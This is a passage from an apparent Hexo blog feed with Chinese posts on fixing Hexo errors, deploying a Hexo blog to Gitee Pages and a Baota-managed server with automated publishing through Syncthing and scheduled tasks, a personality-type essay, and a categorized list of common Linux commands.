deploy</span><br></pre></td></tr></table></figure><p>来进行提交</p><p>9、ERROR Deployer not found: git<br>解决方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure><p>10、Hexo更改主题后启动服务器，界面显如下字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extends includes/layout.pug block content include includes/recent-posts.pug include includes/partial</span><br></pre></td></tr></table></figure><p>执行如下命令，即可解决：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive</span><br><span class="line">清除缓存</span><br><span class="line">hexo clean</span><br><span class="line">生成静态文件即可</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 搭建 </tag>
            
            <tag> 配置 </tag>
            
            <tag> 注意事项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次搭建hexo博客（一）搭建博客和部署自动化发布</title>
      <link href="/67.html"/>
      <url>/67.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">宝塔面板（具体安装过程，自寻百度，网上一堆）</span><br><span class="line">使用系统：CentOS 7.9.2009 x86_64(Py3.7.9)，因为公司电脑限制太多，因此用服务器代替本地电脑（感谢一个博客的提醒，为了避免误导特此说明）</span><br><span class="line">git</span><br><span class="line">gitee</span><br></pre></td></tr></table></figure><h2 id="宝塔"><a href="#宝塔" class="headerlink" title="宝塔"></a>宝塔</h2><p>1、首先在宝塔的软件商店，安装Node.js版本管理器，具体哪个版本看你需要，我这边安装的是1.6<br><img src="https://cos.gjcloak.xyz/file/1.png" alt="Test" title="Test"></p><p>2、进入Node.js版本管理器的设置界面，先安装你需要的版本，然后命令行版本选择你安装的版本，registry源选择淘宝源或者官方源<br><img src="https://cos.gjcloak.xyz/file/2.jpg" alt="Test" title="Test"></p><p>3、进入文件菜单，找一个你要建博客的位置，点击终端，宝塔自动会执行cd指令到你所在目录下<br><img src="https://cos.gjcloak.xyz/file/3.jpg" alt="Test" title="Test"></p><p>4、然后再命令行执行下面这行命令，安装hexo-cli，安装完成后，官方有两种方法来执行hexo指令，我这里用的是第一种方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用hexo指令的两种方法：</span><br><span class="line">第一种是通过npx指令来执行hexo的相关命令：如npx hexo &lt;command&gt;</span><br><span class="line">第二种是将 Hexo 所在的目录下的 node_modules 添加到环境变量之中即可直接使用 hexo &lt;command&gt;</span><br></pre></td></tr></table></figure><p>5、检测hexo是否安装完成,如下图即是安装完成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hexo -v</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/file/4.jpg" alt="Test" title="Test"></p><p>6、hexo安装完成后，执行以下命令创建文件夹的同时会自动初始化hexo，如果不在hexo init后面hexoblog（填入你要搭建的博客文件夹名称，我这边是用的hexoblog）的话，会在你当前的文件夹下自动建立hexo进行初始化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hexo init hexoblog</span><br></pre></td></tr></table></figure><p>7、转到刚刚初始化的hexoblog文件夹下，这时你会发现里面新建了很多文件夹。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd hexoblog</span><br></pre></td></tr></table></figure><p>8、安装npm依赖项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure><p>9、生成静态文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npx hexo generate</span><br><span class="line">或者</span><br><span class="line">npx hexo g</span><br></pre></td></tr></table></figure><p>10、安装hexo-server，Hexo 3.0 开始把服务器独立成了个别模块，要想启动服务器必须先安装这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-server --save</span><br></pre></td></tr></table></figure><p>11、启动服务器前，需要将访问端口先在服务器防火墙开放，然后去hexoblog&#x2F;node_modules&#x2F;hexo-server，打开该路径下的index.js，把第6行的port:4000 改成你自己的端口，如果不改的话，那只需在防火墙放行4000即可，然后启动服务器，不要关闭终端，如需要停服务器，在命令行ctrl+c即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npx hexo server</span><br><span class="line">或者</span><br><span class="line">npx hexo s</span><br></pre></td></tr></table></figure><p>12、访问：<a href="http://localhost:10102/">http://localhost:10102/</a>，出现如下页面就代表搭建成功了。<br><img src="https://cos.gjcloak.xyz/file/5.jpg" alt="txt" title="txt"></p><h2 id="gitee配置"><a href="#gitee配置" class="headerlink" title="gitee配置"></a>gitee配置</h2><p>1、登录 <a href="https://www.gjcloak.top/go/gitee/">gitee</a> 进行注册</p><p>2、新建仓库<br><img src="https://cos.gjcloak.xyz/file/6.jpg" alt="Test" title="Test"></p><p>3、填写信息，创建仓库。是否开源可创建完后，再设置处更改<br><img src="https://cos.gjcloak.xyz/file/8.jpg" alt="Test" title="Test"><br>新建仓库时名称最好是保持跟你注册时的个人空间地址是一样的。因为这样你就不会生成二级域名了。如果不跟注册时的个人空间地址一样的话，到时候自己的网站就会有二级域名的存在了。<br>点击完创建后，就会跳到仓库页面。</p><p>4、部署静态服务<br><img src="https://cos.gjcloak.xyz/file/9.jpg" alt="Test" title="Test"><br>点击服务，Gitee Pages<br><img src="https://cos.gjcloak.xyz/file/10.jpg" alt="Test" title="Test"><br>选择强制使用HTTPS，然后启动。<br>这个时候就会给你生成一个类似https:&#x2F;&#x2F;{你的个人空间地址}.gitee.io（仓库名跟个人空间地址一致）或者https:&#x2F;&#x2F;{你的个人空间地址}.gitee.io&#x2F;{你的仓库名}（仓库名跟个人空间地址不一致）这样的网址。<br>至此，你的gitee的静态页面服务就搭建好了。剩下的就是配置git上传到Gitee的权限了。</p><h2 id="SSH配置"><a href="#SSH配置" class="headerlink" title="SSH配置"></a>SSH配置</h2><p>1、生成本地密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;yourname&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br><span class="line">ssh-keygen -t rsa -C &quot;youremail&quot;</span><br></pre></td></tr></table></figure><p>2、查看密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure><p>3、把查看的密钥，添加本地秘钥到Gitee，在个人设置里，点击SSH公钥，添加公钥，标题自己随便选，公钥就是本地生成的id_rsa.pub里面的内容。<br><img src="https://cos.gjcloak.xyz/file/11.jpg" alt="Test" title="Test"><br>检查下配置是否成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@gitee.com</span><br></pre></td></tr></table></figure><p>配置成功后就可以发布本地生成的博客到Gitee上了</p><h2 id="发布gitee"><a href="#发布gitee" class="headerlink" title="发布gitee"></a>发布gitee</h2><p>1、在hexo初始化的hexoblog的配置文件_config.yml中配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@gitee.com:&#123;注册的个人空间地址&#125;/&#123;仓库名&#125;.git</span><br><span class="line">  branch: master //仓库分支</span><br></pre></td></tr></table></figure><p>2、到hexoblog文件夹里，打开终端，输入以下指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">清除缓存文件和已生成的静态文件</span><br><span class="line">npx hexo clean</span><br><span class="line">生成静态文件</span><br><span class="line">npx hexo generate 或者 npx hexo g</span><br><span class="line">文件生成后立即部署网站</span><br><span class="line">npx hexo deploy 或者 npx hexo d</span><br></pre></td></tr></table></figure><p>这个时候内容就部署到了Gitee上了</p><p>3、Gitee Pages更新内容<br>点击更新，然后就可以通过https:&#x2F;&#x2F;{个人空间地址}.gitee.io（仓库名跟个人空间地址一致）或者https:&#x2F;&#x2F;{个人空间地址}.gitee.io&#x2F;{仓库名}（仓库名跟个人空间地址不一致）访问网站了。</p><p>至此，Hexo到Gitee的部署就实现了！</p><h2 id="发布自己服务器"><a href="#发布自己服务器" class="headerlink" title="发布自己服务器"></a>发布自己服务器</h2><p><img src="https://cos.gjcloak.xyz/uploads/2022/04/18/%E6%96%B0%E5%A2%9E%E7%AB%99%E7%82%B9.jpg" alt="新增站点" title="新增站点"><br>首先新增站点<br><img src="https://cos.gjcloak.xyz/uploads/2022/04/18/public.jpg" alt="public文件夹" title="public文件夹"><br>新增完成后，把hexo博客目录下的pulic文件夹（如果发现博客目录没有这个文件夹，说明没有执行npx hexo g的指令）里的内容复制到新增站点的目录下，即可完成自己服务器部署</p><h2 id="“自动化”发布文章"><a href="#“自动化”发布文章" class="headerlink" title="“自动化”发布文章"></a>“自动化”发布文章</h2><p>按上述方法搭建好hexo博客后，现在就要开始写文章发布了，由于我的博客是部署在服务器的，公司电脑不便于搭建git环境也就没办法进行本地的提交部署，因此为了解决这个问题，我想了个法子来实现专注写文章，大家也可以借鉴一二。</p><blockquote><p><strong><em>思路</em></strong><em>：首先搭建一个文件同步工具，利用同步工具把本地的文章搬运到服务器，在通过定时任务，把服务器指定文件夹里的.md文件复制到hexo目录下存放文章的文件夹里，在通过”二连”操作（即npx hexo clean、npx hexo g）把原先生成静态文件清除，生成新的静态文件，最后把静态文件复制到站点目录下即可</em></p></blockquote><h3 id="搭建同步工具"><a href="#搭建同步工具" class="headerlink" title="搭建同步工具"></a>搭建同步工具</h3><blockquote><p>安装参考了 <a href="https://blog.csdn.net/weixin_44395100/article/details/108233403">本文</a></p></blockquote><p>这里我选择的是Syncthing，服务器通过Docker的方式搭建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name syncthing -d -p 8384:8384 -p 22000:22000 -v /users/syncthing:/var/syncthing syncthing/syncthing</span><br></pre></td></tr></table></figure><p>直接访问<a href="http://ip:8384/">http://ip:8384</a>即可访问</p><p>本地电脑是用的 <a href="https://cos.gjcloak.xyz/uploads/2022/04/18/syncthing-windows-amd64-v1.19.1.zip">绿色版</a></p><p>双击syncthing进行运行，运行后会自动打开<a href="http://127.0.0.1:8384/">http://127.0.0.1:8384</a><br><img src="https://cos.gjcloak.xyz/uploads/2022/04/18/A0AF59A0-F30D-4fc3-854A-07613208FABF.png" alt="本地文件" title="本地文件"></p><p>最后把文件和两个部分相互关联即可</p><h3 id="添加计划"><a href="#添加计划" class="headerlink" title="添加计划"></a>添加计划</h3><p><img src="https://cos.gjcloak.xyz/uploads/2022/04/18/%E8%AE%A1%E5%88%92.jpg" alt="计划任务" title="计划任务"><br>因为服务器使用了宝塔面板，所以这步也简单，在计划任务选择shell脚本，时间看你需要， <strong>第二步和第三步指令都得在hexo博客根目录执行</strong></p><h4 id="第一步-搬运"><a href="#第一步-搬运" class="headerlink" title="第一步 搬运"></a>第一步 搬运</h4><p>这一步把通过同步工具同步的.md文件搬运到hexo博客目录下&#x2F;source&#x2F;_posts文件下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /home/*.md  /mnt/sites/aurora/source/_posts</span><br></pre></td></tr></table></figure><h4 id="第二步-清理"><a href="#第二步-清理" class="headerlink" title="第二步 清理"></a>第二步 清理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># /mnt/sites/aurora 为我的hexo博客路径，可以换成自己的</span><br><span class="line">cd /mnt/sites/aurora</span><br><span class="line">npx hexo clean</span><br></pre></td></tr></table></figure><h4 id="第三步-生成静态文件"><a href="#第三步-生成静态文件" class="headerlink" title="第三步 生成静态文件"></a>第三步 生成静态文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /mnt/sites/aurora</span><br><span class="line">npx hexo g</span><br></pre></td></tr></table></figure><h4 id="第四步-发布"><a href="#第四步-发布" class="headerlink" title="第四步 发布"></a>第四步 发布</h4><p>把public文件夹内所有文件搬运到站点目录下，这里使用cp指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r /mnt/sites/aurora/public/* /mnt/sites/hexo.gjcloak.xyz/</span><br></pre></td></tr></table></figure><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>按上述方法部署好后，只需要在本地把文章写好，放入syncthing中添加的文件里，就会自动同步到服务器，定时任务则会按计划的搬运文章并进行发布操作，这样就完成了”全自动”的文章发布</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 搭建 </tag>
            
            <tag> 静态博客 </tag>
            
            <tag> 自动化 </tag>
            
            <tag> 安装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>“鉴赏家” 人格</title>
      <link href="/65.html"/>
      <url>/65.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>我想要享受人生，一个不同的人生。 我不想每天去去到同一个地方，遇见同样的人，做一样的工作。 我期待有趣的挑战。</p></blockquote><p>艺术能手人格类型的人喜欢用双手和眼睛去探索事物，他们通过冷静的理性主义和精神饱满的好奇心来感知和体验这个世界。 拥有这种人格的人是天生的制造者，他们在不同的项目中穿梭，从创造有用、充足的产物中获得乐趣，并在创造的过程中从外界学习。 艺术能手人格类型的人通常是机械师和工程师，他们亲手拆卸东西，并把它们安装还原到比之前更好一点的状态，从中获得极大的乐趣。<br><img src="https://cos.gjcloak.xyz/file/2022030901032034.jpg" alt="Test"><br>他们通过创造、解决难题、反复试验和第一手的经验来探索新想法。 他们喜欢别人对他们的计划感兴趣，有时候甚至不介意别人介入。 当然，这是建立在那些感兴趣的人不会干涉“艺术能手”原则和自由的基础上，并且能够接受以同样的兴趣回报他们。</p><p>艺术能手人格类型的人喜欢帮助别人和分享他们的经验，特别是他们关心的人。很可惜拥有这种人格类型的人并不常见，大约只占到人口总数的 5%。 艺术能手人格类型的女性尤其罕见，而且她们的角色可能与社会对女性的预期很不相配 — 她们通常从童年开始就被当成是假小子。</p><h2 id="敢于不同"><a href="#敢于不同" class="headerlink" title="敢于不同"></a>敢于不同</h2><p>“艺术能手”们天性保守务实，使他们乍看起来很简单，但实际上读懂他们相当不易。 他们友好又缄默，行事冷静但会突然的不由自主，好奇心旺盛但是不能够持续专注于正式的研究，即便是他们的朋友和爱人也常常觉得他们难以捉摸。 他们可以暂时表现得非常忠诚和稳定，但是他们倾向于积累冲动的能量，并在没有任何征兆的情况下爆发出来，将他们的兴趣带到全新的方向。</p><blockquote><p>当这一人格类型的人发生巨大变化的时候，他们仅仅是在探索新兴趣的可行性，而不是一味的幻想探索。</p></blockquote><p>艺术能手人格类型的人的选择来源于实用的现实主义。他们的心中有很强的公平感，并以此来对待别人。这有助于人们理解他们身上一些令人迷惑的特征。 他们不会过度谨慎，也不会奉行己所不欲勿施于人的信条，反而会更加变本加厉，做出类似的反击，不论好坏，只为公平。</p><p>艺术能手人格类型的人可能面临的最大的问题是，他们通常行动的太早。他们认为宽容的本性是理所当然的，并且想当然地认为别人也是如此。 他们会第一个讲出令人无动于衷的笑话，过度地参与到别人的项目和嬉笑打闹中。他们或许会因为更有趣的事物出现而突然改变计划。</p><h2 id="没有什么比所有都人都赞同更无聊的事情了"><a href="#没有什么比所有都人都赞同更无聊的事情了" class="headerlink" title="没有什么比所有都人都赞同更无聊的事情了"></a>没有什么比所有都人都赞同更无聊的事情了</h2><p>这种人格类型的人会认识到，许多其他类型的人和自己相比，在规则和可接受的行为上有更坚定的界限 — 感情更加细腻的人格类型不想听到令人无动于衷的玩笑，并且绝对不会自己也说一个，也不会参加喧闹的嬉戏，即使是在气氛融洽的聚会上也如此。 如果局面已经很情绪化，超越这些界线就会事与愿违，难以收场。</p><p>这种人格类型的人很难揣测他人的情感，但要揣摩他们内心的情感和动机也并非易事，因此这也算是他们所热爱的公平的一种自然体现。 但他们趋向于用行动而非同情来探索与人之间的关系，这种倾向可能会导致一些非常令人沮丧的情况出现。 拥有艺术能手人格类型的人常常在界线和准则中挣扎，他们更喜欢自由自在，并且在需要的时候稍稍出界。</p><p>如果能与理解他们风格和不可预测性的朋友一起共事，再加上他们的创造力、幽默感和亲力亲为，以创造可行的解决方案和实用的东西，那么“艺术能手”们会一直非常乐意创造各种有用的物品，并真心实意地喜欢它们。</p><p>文章参考自<a href="https://baike.baidu.com/item/%E9%89%B4%E8%B5%8F%E5%AE%B6%E5%9E%8B%E4%BA%BA%E6%A0%BC/60211688">这里</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测试 </tag>
            
            <tag> 人格 </tag>
            
            <tag> 探索 </tag>
            
            <tag> 艺术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用的166个指令</title>
      <link href="/66.html"/>
      <url>/66.html</url>
      
        <content type="html"><![CDATA[<p>线上查询及帮助命令（2个）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">man：查看命令帮助，更复杂的还有info，但不常用</span><br><span class="line">help：查看Linux内置命令的帮助，比如cd命令。</span><br></pre></td></tr></table></figure><p>文件和目录操作命令（18个）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ls：全拼list，功能是列出目录的内容及其内容属性信息。</span><br><span class="line">cd：全拼change directory，功能是从当前工作目录切换到指定的工作目录。</span><br><span class="line">cp：全拼copy，其功能为复制文件或目录。</span><br><span class="line">find：查找的意思，用于查找目录及目录下的文件。</span><br><span class="line">mkdir：全拼make directories，其功能是创建目录。</span><br><span class="line">mv：全拼move，其功能是移动或重命名文件。</span><br><span class="line">pwd：全拼print working directory，其功能是显示当前工作目录的绝对路径。</span><br><span class="line">rename：用于重命名文件。</span><br><span class="line">rm：全拼remove，其功能是删除一个或多个文件或目录。</span><br><span class="line">rmdir：全拼remove empty directories，功能是删除空目录。</span><br><span class="line">touch：创建新的空文件，改变已有文件的时间戳属性。</span><br><span class="line">tree：功能是以树形结构显示目录下的内容。</span><br><span class="line">basename：显示文件名或目录名。</span><br><span class="line">dirname：显示文件或目录路径。</span><br><span class="line">chattr：改变文件的扩展属性。</span><br><span class="line">lsattr：查看文件扩展属性。</span><br><span class="line">file：显示文件的类型。</span><br><span class="line">md5sum：计算和校验文件的MD5值。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;查看文件及内容处理命令(21个)&lt;/p&gt;</span><br><span class="line">cat：全拼concatenate，功能是用于连接多个文件并且打印到屏幕输出或重定向到指定文件中。</span><br><span class="line">tac：是cat的反向拼写，因此命令的功能为反向显示文件内容。</span><br><span class="line">more：分页显示文件内容。</span><br><span class="line">less：分页显示文件内容，more命令的相反用法。</span><br><span class="line">head：显示文件内容的头部。</span><br><span class="line">tail：显示文件内容的尾部。</span><br><span class="line">cut：将文件的每一行按指定分隔符分割并输出。</span><br><span class="line">split：分割文件为不同的小片段。</span><br><span class="line">paste：按行合并文件内容。</span><br><span class="line">sort：对文件的文本内容排序。</span><br><span class="line">uniq：去除重复行。</span><br><span class="line">wc：统计文件的行数、单词数或字节数。</span><br><span class="line">iconv：转换文件的编码格式。</span><br><span class="line">dos2unix：将DOS格式文件转换成UNIX格式。</span><br><span class="line">diff：全拼difference，比较文件的差异，常用于文本文件。</span><br><span class="line">vimdiff：命令行可视化文件比较工具，常用于文本文件。</span><br><span class="line">rev：反向输出文件内容。</span><br><span class="line">grep/egrep：过滤字符串，三剑客老三。</span><br><span class="line">join：按两个文件的相同字段合并。</span><br><span class="line">tr：替换或删除字符。</span><br><span class="line">vi/vim：命令行文本编辑器。</span><br></pre></td></tr></table></figure><p>文件压缩及解压缩命令(4个)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar：打包压缩。</span><br><span class="line">unzip：解压文件。</span><br><span class="line">gzip：压缩工具。</span><br><span class="line">zip：压缩工具。</span><br></pre></td></tr></table></figure><p>信息显示命令(11个)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">uname：显示操作系统相关信息的命令。</span><br><span class="line">hostname：显示或者设置当前系统的主机名。</span><br><span class="line">dmesg：显示开机信息，用于诊断系统故障。</span><br><span class="line">uptime：显示系统运行时间及负载。</span><br><span class="line">stat：显示文件或文件系统的状态。</span><br><span class="line">du：计算磁盘空间使用情况。</span><br><span class="line">df：报告文件系统磁盘空间的使用情况。</span><br><span class="line">top：实时显示系统资源使用情况。</span><br><span class="line">free：查看系统内存。</span><br><span class="line">date：显示与设置系统时间。</span><br><span class="line">cal：查看日历等时间信息。</span><br></pre></td></tr></table></figure><p>搜索文件命令(4个)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">which：查找二进制命令，按环境变量PATH路径查找。</span><br><span class="line">find：从磁盘遍历查找文件或目录。</span><br><span class="line">whereis：查找二进制命令，按环境变量PATH路径查找。</span><br><span class="line">locate：从数据库 (/var/lib/mlocate/mlocate.db) 查找命令，使用updatedb更新库。</span><br></pre></td></tr></table></figure><p>用户管理命令(10个)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">useradd：添加用户。</span><br><span class="line">usermod：修改系统已经存在的用户属性。</span><br><span class="line">userdel：删除用户。</span><br><span class="line">groupadd：添加用户组。</span><br><span class="line">passwd：修改用户密码。</span><br><span class="line">chage：修改用户密码有效期限。</span><br><span class="line">id：查看用户的uid,gid及归属的用户组。</span><br><span class="line">su：切换用户身份。</span><br><span class="line">visudo：编辑/etc/sudoers文件的专属命令。</span><br><span class="line">sudo：以另外一个用户身份(默认root用户)执行事先在sudoers文件允许的命令。</span><br></pre></td></tr></table></figure><p>基础网络操作命令(11个)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">telnet：使用TELNET协议远程登录。</span><br><span class="line">ssh：使用SSH加密协议远程登录。</span><br><span class="line">scp：全拼secure copy，用于不同主机之间复制文件。</span><br><span class="line">wget：命令行下载文件。</span><br><span class="line">ping：测试主机之间网络的连通性。</span><br><span class="line">route：显示和设置linux系统的路由表。</span><br><span class="line">ifconfig：查看、配置、启用或禁用网络接口的命令。</span><br><span class="line">ifup：启动网卡。</span><br><span class="line">ifdown：关闭网卡。</span><br><span class="line">netstat：查看网络状态。</span><br><span class="line">ss：查看网络状态。</span><br></pre></td></tr></table></figure><p>深入网络操作命令(9个)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap：网络扫描命令。</span><br><span class="line">lsof：全名list open files，也就是列举系统中已经被打开的文件。</span><br><span class="line">mail：发送和接收邮件。</span><br><span class="line">mutt：邮件管理命令。</span><br><span class="line">nslookup：交互式查询互联网DNS服务器的命令。</span><br><span class="line">dig：查找DNS解析过程。</span><br><span class="line">host：查询DNS的命令。</span><br><span class="line">traceroute：追踪数据传输路由状况。</span><br><span class="line">tcpdump：命令行的抓包工具。</span><br></pre></td></tr></table></figure><p>磁盘与文件系统的命令(16个)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mount：挂载文件系统。</span><br><span class="line">umount：卸载文件系统。</span><br><span class="line">fsck：检查并修复Linux文件系统。</span><br><span class="line">dd：转换或复制文件。</span><br><span class="line">dumpe2fs：导出ext2/ext3/ext4文件系统信息。</span><br><span class="line">dumpe：xt2/3/4文件系统备份工具。</span><br><span class="line">fdisk：磁盘分区命令，适用于2TB以下磁盘分区。</span><br><span class="line">parted：磁盘分区命令，没有磁盘大小限制，常用于2TB以下磁盘分区。</span><br><span class="line">mkfs：格式化创建Linux文件系统。</span><br><span class="line">partprobe：更新内核的硬盘分区表信息。</span><br><span class="line">e2fsck：检查ext2/ext3/ext4类型文件系统。</span><br><span class="line">mkswap：创建Linux交换分区。</span><br><span class="line">swapon：启用交换分区。</span><br><span class="line">swapoff：关闭交换分区。</span><br><span class="line">sync：将内存缓冲区内的数据写入磁盘。</span><br><span class="line">resize2fs：调整ext2/ext3/ext4文件系统大小。</span><br></pre></td></tr></table></figure><p>系统权限及用户授权相关命令(4个)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod：改变文件或目录权限。</span><br><span class="line">chown：改变文件或目录的属主和属组。</span><br><span class="line">chgrp：更改文件用户组。</span><br><span class="line">umask：显示或设置权限掩码。</span><br></pre></td></tr></table></figure><p>系统用户登录信息的命令(7个)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">whoami：显示当前有效的用户名称，相当于执行id -un命令。</span><br><span class="line">who：显示目前登录系统的用户信息。</span><br><span class="line">w：显示已经登录系统的用户列表，并显示用户正在执行的指令。</span><br><span class="line">last：显示登入系统的用户。</span><br><span 